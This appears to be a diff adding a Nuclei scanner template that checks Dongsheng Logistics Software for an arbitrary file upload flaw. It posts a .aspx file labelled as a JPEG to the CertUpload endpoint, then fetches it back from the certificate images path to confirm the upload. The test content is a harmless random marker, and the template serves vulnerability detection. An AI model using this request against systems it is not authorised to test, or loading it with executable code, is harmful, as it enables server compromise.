@@ -1,0 +1,56 @@
+id: dongshengsoft-certupload-anyfile-upload
+
+info:
+  name: Dongsheng Logistics Software CertUpload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/MsWlTruck/CertUpload"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+    body: |
+      ------WebKitFormBoundaryTqkdY1lCvbvpmown
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryTqkdY1lCvbvpmown
+      Content-Disposition: form-data; name="TruckNo";
+
+      1
+      ------WebKitFormBoundaryTqkdY1lCvbvpmown
+      Content-Disposition: form-data; name="Cert_Type";
+
+      1
+      ------WebKitFormBoundaryTqkdY1lCvbvpmown--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '\"success\": true')"
+          - "contains(body, '.aspx')"
+    extractors:
+      - type: regex
+        name: file
+        regex:
+          - "\\\\(?P<file>[0-9_]+).aspx"
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Areas/TruckMng/CertImages/1/{{file}}.aspx"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "body == t2"
